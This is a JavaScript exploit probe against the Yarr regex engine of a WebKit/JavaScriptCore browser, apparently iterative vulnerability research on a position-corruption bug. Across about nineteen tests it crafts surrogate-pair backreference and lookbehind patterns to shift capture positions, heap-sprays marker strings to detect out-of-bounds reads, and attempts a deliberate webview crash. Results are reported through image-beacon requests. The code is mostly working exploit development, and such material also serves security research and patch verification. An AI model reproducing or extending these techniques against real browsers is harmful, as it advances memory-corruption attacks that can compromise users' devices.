// p234-yarr-c3-oob-probe.js — Yarr C3 position corruption OOB escalation probe
// Bug: Bugzilla 312690, fix f44dcfd
// Source: YarrInterpreter.cpp:609-655 (tryConsumeBackReference)
//         YarrInterpreter.cpp:351-358 (reread — only ASSERT bounds check, compiled out)
//         JSString.h:992 (jsSubstringOfResolved — only ASSERT bounds check)
//         StringView.h:550 (characterAt — only ASSERT bounds check)
//
// TWO corruption paths:
//   FORWARD (+1): readChecked calls next() for surrogate pair during backref matching.
//     uncheckInput(matchSize) on failure doesn't account for next(). net: pos+1.
//     BLOCKED by atEnd() guard in readChecked when pos==length.
//   BACKWARD (-1): tryReadBackward calls rewind(1) for surrogate pair during backref matching.
//     Greedy loop doesn't restore pos on failure. net: pos-1.
//     BLOCKED by p>0 check when reading at position 0.
//
// OOB ESCALATION PATHS:
//   Path 1: Forward +1 shifts capture matchBegin past string end.
//     jsSubstringOfResolved(offset, 1) -> characterAt(offset) reads OOB with no release check.
//   Path 2: Backward -N underflow wraps matchBegin to 0xFFFFFFFE.
//     reread(0xFFFFFFFE) -> input[0xFFFFFFFE] -> SEGFAULT (crash = proof of OOB).
//   Path 3: Forward compound (+N from N backreferences) shifts capture far enough for OOB.
//
// P233 device results: A-CAPS confirmed match. Most escalation tests NULL.
// This probe redesigns with precise input sizing to hit the OOB boundary.

(function() {
  var B = "V234-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  function hexCP(s, max) {
    max = max || 30;
    var r = [];
    for (var i = 0; i < s.length && i < max; i++)
      r.push(s.charCodeAt(i).toString(16).padStart(4, "0"));
    return r.join("-");
  }

  beacon("START");

  // === TEST A: Verify forward corruption observability ===
  // Pattern: backreference \1* encounters surrogate, readChecked next() gives +1
  // We observe the capture shift via replace() callback
  try {
    // Input needs extra chars AFTER surrogate for atEnd bypass
    // a + \u{10000}(2 code units) + bb = [a, D800, DC00, b, b], L=5
    var input_a = "a\u{10000}bb";
    // Pattern: ^(a)\1*(.)..$ — after \1* corruption, (.) captures shifted char
    // minimumSize=4 (a + . + b + b = missing, let me use replace)
    var re_a = /(?<=(\u{10000})\1*(a))b/u;
    var caps_a = [];
    input_a.replace(re_a, function() {
      for (var i = 0; i < arguments.length; i++) {
        var v = arguments[i];
        caps_a.push(i + ":" + (v === undefined ? "U" :
                    typeof v === "number" ? v :
                    typeof v === "string" ? "L" + v.length + "=" + hexCP(v, 10) : typeof v));
      }
      return "X";
    });
    beacon("A-" + (caps_a.length ? caps_a.join(",").slice(0, 250) : "NOCAPS"));
  } catch(e) {
    beacon("A-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST B: Forward +1 via replace callback — observe capture position directly ===
  // Use regex with capture AFTER the backreference in forward matching
  // Pattern: (a)\1*(.) — forward matching, \1* encounters surrogate
  try {
    // [a, D800, DC00, b, c], L=5
    var input_b = "a\u{10000}bc";
    var re_b = /(a)\1*(.)/u;
    var caps_b = [];
    input_b.replace(re_b, function(match, g1, g2, offset, str) {
      caps_b.push("m=" + hexCP(match, 10));
      caps_b.push("g1=" + hexCP(g1, 5));
      caps_b.push("g2=" + hexCP(g2, 5));
      caps_b.push("off=" + offset);
      // g2 should be at position 1 (the first char after 'a')
      // with +1 corruption: g2 captures from position 2 (trail surrogate DC00)
      // without corruption: g2 captures from position 1 (lead surrogate D800)
      var g2code = g2.charCodeAt(0);
      caps_b.push("g2cp=" + g2code.toString(16));
      // DC00 = corruption happened (shifted to trail)
      // D800 = no corruption (reads lead as expected)
      // 0061 (a) = different position
      return "X";
    });
    beacon("B-" + (caps_b.length ? caps_b.join(",").slice(0, 250) : "NOCAPS"));
  } catch(e) {
    beacon("B-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST C: Forward compound +2 via two backreferences ===
  // Each backreference encounters a separate surrogate pair
  try {
    // [a, b, D800, DC00, D808, DC01, c, d, e], L=9
    var input_c = "ab\u{10000}\u{10001}cde";
    // (a)\1*(b)\2*(.)
    var re_c = /(a)\1*(b)\2*(.)/u;
    var caps_c = [];
    input_c.replace(re_c, function(match, g1, g2, g3, offset) {
      caps_c.push("g1=" + hexCP(g1));
      caps_c.push("g2=" + hexCP(g2));
      caps_c.push("g3=" + hexCP(g3) + "[cp=" + g3.charCodeAt(0).toString(16) + "]");
      caps_c.push("off=" + offset);
      // If +2 corruption: g3 reads 2 positions past expected
      return "X";
    });
    beacon("C-" + (caps_c.length ? caps_c.join(",").slice(0, 250) : "NOCAPS"));
  } catch(e) {
    beacon("C-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST D: Forward compound +3 via three backreferences ===
  try {
    // [a, b, c, D800, DC00, D808, DC01, D810, DC02, d, e, f], L=12
    var input_d = "abc\u{10000}\u{10001}\u{10002}def";
    var re_d = /(a)\1*(b)\2*(c)\3*(.)/u;
    var caps_d = [];
    input_d.replace(re_d, function(match, g1, g2, g3, g4, offset) {
      caps_d.push("g4=" + hexCP(g4) + "[cp=" + g4.charCodeAt(0).toString(16) + "]");
      caps_d.push("off=" + offset);
      // If +3: g4 reads 3 positions past expected → might be OOB!
      return "X";
    });
    beacon("D-" + (caps_d.length ? caps_d.join(",").slice(0, 250) : "NOCAPS"));
  } catch(e) {
    beacon("D-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST E: Backward -1 in lookbehind — capture recorded with corrupted pos ===
  // (?<=\3*(c)(b)\2*(a)) — backward order: (a), \2*, (b), \3*, (c)
  // Captures (b) and (c) are recorded AFTER \2*'s corruption
  try {
    // Input: \u{10000}cba + X = [D800, DC00, c, b, a, X], L=6
    var input_e = "\u{10000}cbaX";
    // lookbehind: matches backward from X: (a), then \2*, then (b), then \3*, then (c)
    // \2* references group 2=(b). But (b) not captured yet → empty. No corruption.
    // Need: captured group referenced BEFORE current position.
    // Use: (?<=(c)(b)\2*(a)) with \2* referencing (b) which is captured first in backward
    // Backward order: (a) → \2* → (b) → (c)
    // But \2 refs group 2=(b) which isn't captured yet at \2* time!
    // Fix: (?<=(c)\3*(b)\2*(a)) — \3* refs group 3=(a), \2* refs group 2=(b)
    // Backward: (a) → \2* → (b) → \3* → (c)
    // \2* at step 2: group 2=(b) not captured → empty
    // \3* at step 4: group 3=(a) captured at step 1! Can trigger corruption!
    var re_e = /(?<=(c)\3*(b)\2*(a))X/u;
    var caps_e = [];
    input_e.replace(re_e, function(match, g1, g2, g3, offset) {
      caps_e.push("m=" + hexCP(match));
      caps_e.push("g1=" + (g1 ? hexCP(g1) + "[cp=" + g1.charCodeAt(0).toString(16) + "]" : "U"));
      caps_e.push("g2=" + (g2 ? hexCP(g2) + "[cp=" + g2.charCodeAt(0).toString(16) + "]" : "U"));
      caps_e.push("g3=" + (g3 ? hexCP(g3) + "[cp=" + g3.charCodeAt(0).toString(16) + "]" : "U"));
      caps_e.push("off=" + offset);
      return "X";
    });
    beacon("E-" + (caps_e.length ? caps_e.join(",").slice(0, 250) : "NOCAPS"));
  } catch(e) {
    beacon("E-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST F: Backward double corruption — two backrefs hit surrogates ===
  // Pattern crafted so BOTH backrefs encounter surrogate pairs
  // (?<=\4*(d)\3*(c)(b)\2*(a))X with surrogates at right positions
  try {
    // Build input where surrogates are at positions reached by backward backref reads
    // \u{10000}\u{10001}dcbaX = [D800, DC00, D808, DC01, d, c, b, a, X], L=9
    var input_f = "\u{10000}\u{10001}dcbaX";
    var re_f = /(?<=\4*(d)\3*(c)(b)\2*(a))X/u;
    var caps_f = [];
    input_f.replace(re_f, function() {
      for (var i = 0; i < arguments.length - 2; i++) {
        var v = arguments[i];
        if (typeof v === "string") {
          caps_f.push("a" + i + "=" + hexCP(v, 5) + "[" + v.charCodeAt(0).toString(16) + "]");
        } else {
          caps_f.push("a" + i + "=" + v);
        }
      }
      return "X";
    });
    beacon("F-" + (caps_f.length ? caps_f.join(",").slice(0, 200) : "NOCAPS"));
  } catch(e) {
    beacon("F-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST G: Exact boundary — capture at end of string with +1 forward ===
  // If corruption +1 pushes capture matchBegin to L, jsSubstringOfResolved reads OOB
  // Need: capture at position L-1, corruption shifts to L.
  // Strategy: no $ anchor. Use greedy capture that extends to end.
  // The greedy capture's matchEnd = L - inputPosition. With +1, matchEnd unchanged (greedy stops at end).
  // BUT matchBegin shifted by +1. If matchBegin + matchSize exceeds L → substring OOB.
  try {
    // Spray known data after the string allocation
    var spray_g = [];
    for (var gi = 0; gi < 500; gi++) {
      spray_g.push("䅁䉂䍃䑄"); // Known pattern AABBCCDD
    }

    // Input: a + \u{10000} + X (short string, may be followed by spray)
    // [a, D800, DC00, X], L=4
    var input_g = "a\u{10000}X";
    var re_g = /(a)\1*(.+)/u;
    var result_g = re_g.exec(input_g);
    if (result_g) {
      var g2 = result_g[2];
      beacon("G-MATCH-g2len=" + g2.length + "-g2=" + hexCP(g2, 15));
      // Check each char for OOB markers
      for (var gj = 0; gj < g2.length && gj < 20; gj++) {
        var cc = g2.charCodeAt(gj);
        if (cc === 0x4141 || cc === 0x4242 || cc === 0x4343 || cc === 0x4444) {
          beacon("G-OOB-MARKER-at" + gj + "-" + cc.toString(16));
        }
      }
    } else {
      beacon("G-NULL");
    }
    spray_g = null;
  } catch(e) {
    beacon("G-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST H: Backward underflow crash test ===
  // If backward corruption gives -2 and capture was at position 0:
  // matchBegin = 0 - 2 = 0xFFFFFFFE (unsigned). As int: -2. start >= 0 → FALSE → undefined.
  // BUT: if we use the capture in a backreference, reread(0xFFFFFFFE) is called → CRASH.
  // This is a DESTRUCTIVE test — it may kill the webview process.
  try {
    beacon("H-ATTEMPTING-CRASH");
    // Need: capture at position 0, -2 backward corruption, then backreference outside lookbehind
    // (?<=(a)\1*(b))X\2 — but we need TWO corruptions
    // More complex: (?<=(b)\3*\4*(d)(c)\2*(a))X\1
    // This is very hard to construct reliably. Start with -1:
    // (?<=(a)\1*\u{10000})X — if capture (a) gets -1 corruption
    // Then outside: reference \1
    // Input: \u{10000}a\u{10000}X...something that matches \1
    var input_h = "\u{10000}a\u{10000}Xa";
    // (?<=(a)\1*\u{10000})Xa — the Xa matches if (a)='a' and the lookbehind works
    // Wait, the backreference \1 INSIDE the lookbehind. We need it OUTSIDE.
    // Pattern: (?<=(a)\1*)X then \1 outside
    var re_h = /(?<=\u{10000}\1*(a))X\1/u;
    var result_h = re_h.exec(input_h);
    beacon("H-" + (result_h === null ? "NULL" : "MATCH-" + hexCP("" + result_h, 10)));
  } catch(e) {
    beacon("H-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST I: Direct exec() position observation ===
  // Use the 'd' (hasIndices) flag to get exact capture positions
  try {
    var input_i = "a\u{10000}bc";
    var re_i = /(a)\1*(.)/ud;  // 'd' flag = hasIndices
    var result_i = re_i.exec(input_i);
    if (result_i && result_i.indices) {
      var idx = result_i.indices;
      var parts = [];
      for (var ii = 0; ii < idx.length; ii++) {
        if (idx[ii]) {
          parts.push("g" + ii + "=[" + idx[ii][0] + "," + idx[ii][1] + "]");
        } else {
          parts.push("g" + ii + "=U");
        }
      }
      beacon("I-IDX-" + parts.join(","));
      // Expected without corruption: g0=[0,?], g1=[0,1], g2=[1,2] (or [1,3] for surrogate)
      // With +1 corruption: g2=[2,3] instead of [1,2]
    } else if (result_i) {
      beacon("I-NOINDICES");
    } else {
      beacon("I-NULL");
    }
  } catch(e) {
    beacon("I-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST J: exec() with hasIndices for compound +2 ===
  try {
    var input_j = "ab\u{10000}\u{10001}cde";
    var re_j = /(a)\1*(b)\2*(.)/ud;
    var result_j = re_j.exec(input_j);
    if (result_j && result_j.indices) {
      var idx_j = result_j.indices;
      var parts_j = [];
      for (var ji = 0; ji < idx_j.length; ji++) {
        if (idx_j[ji]) {
          parts_j.push("g" + ji + "=[" + idx_j[ji][0] + "," + idx_j[ji][1] + "]");
        } else {
          parts_j.push("g" + ji + "=U");
        }
      }
      beacon("J-IDX-" + parts_j.join(","));
    } else {
      beacon("J-" + (result_j ? "NOINDICES" : "NULL"));
    }
  } catch(e) {
    beacon("J-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST K: Critical boundary test with heap spray ===
  // Allocate many small strings to fill the heap, then create target string
  // If capture position = L, characterAt(L) reads from next heap object
  try {
    // Spray 16-char strings filled with 0xBEBE pattern
    var spray_k = [];
    for (var ki = 0; ki < 2000; ki++) {
      spray_k.push(String.fromCharCode(0xBEBE, 0xBEBE, 0xBEBE, 0xBEBE,
                                        0xBEBE, 0xBEBE, 0xBEBE, 0xBEBE));
    }

    // Target input: "a" + surrogate + rest, padded to specific length
    // The length determines whether +1 corruption pushes past the boundary
    var padLen = 30;
    var target_k = "a\u{10000}" + "b".repeat(padLen);
    beacon("K-LEN=" + target_k.length);

    var re_k = /(a)\1*(.+)/u;
    var result_k = re_k.exec(target_k);
    if (result_k) {
      var g2_k = result_k[2];
      beacon("K-g2len=" + g2_k.length + "-last5=" + hexCP(g2_k.slice(-5)));
      // Check if last char is 0xBEBE (from spray = OOB read!)
      var lastCC = g2_k.charCodeAt(g2_k.length - 1);
      beacon("K-lastchar=" + lastCC.toString(16));
      if (lastCC === 0xBEBE) {
        beacon("K-OOB-CONFIRMED");
      } else if (lastCC !== 0x62) { // 'b'
        beacon("K-UNEXPECTED-" + lastCC.toString(16));
      } else {
        beacon("K-INBOUNDS");
      }
    } else {
      beacon("K-NULL");
    }
    spray_k = null;
  } catch(e) {
    beacon("K-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST L: Forward +1 with backreference AFTER corruption ===
  // If (b) capture is shifted +1, and \2 outside uses it, reread reads shifted position
  // Specifically test whether reread can be forced to read past string end
  try {
    // Input: "a" + \u{10000} + "bb" = [a, D800, DC00, b, b], L=5
    // Pattern: (a)\1*(b)(b)\2  — \2 references group 2
    // After +1 corruption, group 2 captures at position 3 instead of 2
    // Then \2 calls reread(3) which is still in bounds (input[3] = 'b')
    // Need group 2 at the LAST position for OOB
    var input_l = "a\u{10000}b";  // [a, D800, DC00, b], L=4
    // (a)\1*(b)\2 — group 2 should be at position L-1=3
    // With +1: group 2 at position 4 → reread(4) = input[4] → OOB!
    var re_l = /(a)\1*(b)\2/u;
    var result_l = re_l.exec(input_l);
    beacon("L-" + (result_l === null ? "NULL" : "MATCH-" + hexCP("" + result_l, 10)));
  } catch(e) {
    beacon("L-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST M: Extended forward corruption with greedy capture at end ===
  // Allocate string where the capture group MUST be at the very end
  // Use varying padding to probe the exact boundary
  try {
    for (var padM = 0; padM < 10; padM++) {
      var input_m = "a\u{10000}" + "b".repeat(padM);
      var re_m = /(a)\1*(.+)/ud;
      var result_m = re_m.exec(input_m);
      if (result_m && result_m.indices) {
        var g2_indices = result_m.indices[2];
        var g2_text = result_m[2];
        var lastCC_m = g2_text.charCodeAt(g2_text.length - 1);
        beacon("M" + padM + "-idx=[" + g2_indices[0] + "," + g2_indices[1] + "]-last=" + lastCC_m.toString(16) + "-len=" + g2_text.length);
      } else {
        beacon("M" + padM + "-" + (result_m ? "NOINDICES" : "NULL"));
      }
    }
  } catch(e) {
    beacon("M-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST N: Backward corruption via replace callback — observe shifts ===
  // Use lookbehind with captures that record AFTER corruption
  // (?<=(c)\3*(b)(a)) — backward: (a), (b), \3*, (c)
  // \3* refs group 3=(a), captured at step 1. If it hits surrogate → -1.
  // (c) captured at step 4 with -1 corruption.
  try {
    // Input with surrogate between characters: \u{10000}cba + "X"
    var input_n = "\u{10000}cbaX";
    // Need (a) to be captured, then \3* matching 'a' backward encounters the surrogate pair
    // (?<=(c)\3*(b)(a))X
    // Backward: (a) at pos-1, (b) at pos-2, \3* tries 'a' backward, (c) at pos-K
    var re_n = /(?<=(c)\3*(b)(a))X/u;
    var caps_n = [];
    input_n.replace(re_n, function(m, g1, g2, g3, offset) {
      caps_n.push("g1=" + (g1 ? hexCP(g1) + "[" + g1.charCodeAt(0).toString(16) + "]" : "U"));
      caps_n.push("g2=" + (g2 ? hexCP(g2) + "[" + g2.charCodeAt(0).toString(16) + "]" : "U"));
      caps_n.push("g3=" + (g3 ? hexCP(g3) + "[" + g3.charCodeAt(0).toString(16) + "]" : "U"));
      caps_n.push("off=" + offset);
      return "X";
    });
    beacon("N-" + (caps_n.length ? caps_n.join(",").slice(0, 200) : "NOCAPS"));
  } catch(e) {
    beacon("N-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST O: The canonical trigger from Bugzilla 312690 ===
  // Use hasIndices to get EXACT capture start/end positions
  try {
    var input_o = "\u{10000}ab";
    var re_o = /(?<=\u{10000}\1*(a))b/ud;
    var result_o = re_o.exec(input_o);
    if (result_o) {
      var msg = "MATCH";
      if (result_o.indices) {
        for (var oi = 0; oi < result_o.indices.length; oi++) {
          var idx_o = result_o.indices[oi];
          msg += "-g" + oi + "=[" + (idx_o ? idx_o[0] + "," + idx_o[1] : "U") + "]";
        }
      }
      // Also check the captured text
      for (var oj = 0; oj < result_o.length; oj++) {
        var v_o = result_o[oj];
        msg += "-v" + oj + "=" + (v_o === undefined ? "U" : hexCP(v_o, 5));
      }
      beacon("O-" + msg);
    } else {
      beacon("O-NULL");
    }
  } catch(e) {
    beacon("O-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST P: Forward +1 with exec().indices — the key OOB indicator ===
  // If indices show capture positions PAST string.length, OOB is confirmed
  try {
    // Several input sizes to find the sweet spot
    var sizes = [3, 4, 5, 6, 8, 10, 15, 20, 32, 50];
    for (var si = 0; si < sizes.length; si++) {
      var padP = sizes[si];
      var input_p = "a\u{10000}" + "b".repeat(padP);
      var L = input_p.length;
      var re_p = /(a)\1*(.+)/ud;
      var result_p = re_p.exec(input_p);
      if (result_p && result_p.indices) {
        var g0 = result_p.indices[0];
        var g1 = result_p.indices[1];
        var g2 = result_p.indices[2];
        var oob = (g2 && g2[1] > L) ? "OOB" : "OK";
        beacon("P" + padP + "-L=" + L + "-g2=[" + g2[0] + "," + g2[1] + "]-" + oob);
      } else {
        beacon("P" + padP + "-" + (result_p ? "NOINDICES" : "NULL"));
      }
    }
  } catch(e) {
    beacon("P-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST Q: Alternative forward pattern — 'a' appears AFTER surrogate ===
  // Input: \u{10000}aab = [D800, DC00, a, a, b], L=5
  // Pattern: (a)\1*(.) — \1* successfully matches first 'a', then fails on 'b'
  // No surrogate encounter → no corruption. Need surrogate BETWEEN 'a' captures.
  // Input: a + \u{10000} + a + b = [a, D800, DC00, a, b], L=5
  // \1* first try: reads position after 'a' = D800 (surrogate) → corruption!
  // \1* loop stops. (.) captures at corrupted position.
  try {
    var input_q = "a\u{10000}ab";
    var re_q = /(a)\1*(.)/ud;
    var result_q = re_q.exec(input_q);
    if (result_q && result_q.indices) {
      var g2_q = result_q.indices[2];
      var g2t_q = result_q[2];
      beacon("Q-g2=[" + g2_q[0] + "," + g2_q[1] + "]-val=" + hexCP(g2t_q, 5) + "-cp=" + g2t_q.charCodeAt(0).toString(16));
      // Expected without corruption: g2=[1,2] val=D800 (or supplementary)
      // With +1 corruption: g2=[2,3] val=DC00 (trail surrogate)
    } else {
      beacon("Q-" + (result_q ? "NOINDICES" : "NULL"));
    }
  } catch(e) {
    beacon("Q-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST R: Forward reread OOB via backref to shifted capture ===
  // This is the money shot: corrupted capture used by outer backref → reread OOB
  // Pattern: (a)\1*(.)X\2 — \2 uses the shifted capture
  // If capture (.)'s position is past string end, reread reads OOB
  try {
    // Input: a + \u{10000} + last_char + X + expected_backref_match
    // [a, D800, DC00, b, X, b], L=6
    // \1* encounters D800 → +1 corruption
    // (.) captures at pos+1: normally position 1, corrupted to 2 (DC00)
    // \2 tries to match DC00 at position after X: position 5 = 'b'
    // DC00 != 'b' → fail. Regex doesn't match.
    // Alternative: make the backref match succeed by having DC00 at position 5
    var input_r1 = "a\u{10000}\uDC00X\uDC00";
    var re_r = /(a)\1*(.)X\2/u;
    var result_r1 = re_r.exec(input_r1);
    beacon("R1-" + (result_r1 === null ? "NULL" : "MATCH"));

    // Alternative: use case insensitive or wildcard in backref? Can't.
    // Alternative: use (.) at the very end → no need for \2 match
    // Just observe the capture indices
    var input_r2 = "a\u{10000}b";
    var re_r2 = /(a)\1*(.)/ud;
    var result_r2 = re_r2.exec(input_r2);
    if (result_r2 && result_r2.indices) {
      var g2r = result_r2.indices[2];
      var L_r = input_r2.length;
      beacon("R2-L=" + L_r + "-g2=[" + g2r[0] + "," + g2r[1] + "]-" + (g2r[1] > L_r ? "PAST_END" : "OK"));
    } else {
      beacon("R2-" + (result_r2 ? "NI" : "NULL"));
    }
  } catch(e) {
    beacon("R-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  // === TEST S: The definitive characterAt OOB test ===
  // If any test above shows capture indices past string.length:
  // The substring extraction calls characterAt(offset) with no bounds check.
  // This test reads the captured text's charCodeAt and checks for unexpected values.
  try {
    // Spray with 0xDEAD pattern
    var spray_s = [];
    for (var si2 = 0; si2 < 3000; si2++) {
      spray_s.push(String.fromCharCode(0xDEAD).repeat(32));
    }

    // Create target string right after spray
    var target_s = "a\u{10000}" + "Z".repeat(10);
    var re_s = /(a)\1*(.+)/u;
    var result_s = re_s.exec(target_s);
    if (result_s) {
      var g2s = result_s[2];
      var lastChars = [];
      for (var sk = Math.max(0, g2s.length - 5); sk < g2s.length; sk++) {
        lastChars.push(g2s.charCodeAt(sk).toString(16));
      }
      beacon("S-g2len=" + g2s.length + "-last5=" + lastChars.join("-"));
      // Check for 0xDEAD in capture (would indicate OOB read from spray)
      for (var sm = 0; sm < g2s.length; sm++) {
        if (g2s.charCodeAt(sm) === 0xDEAD) {
          beacon("S-OOB-DEAD-at" + sm);
          break;
        }
      }
    } else {
      beacon("S-NULL");
    }
    spray_s = null;
  } catch(e) {
    beacon("S-ERR-" + encodeURIComponent(e.message).slice(0, 60));
  }

  beacon("DONE");
})();
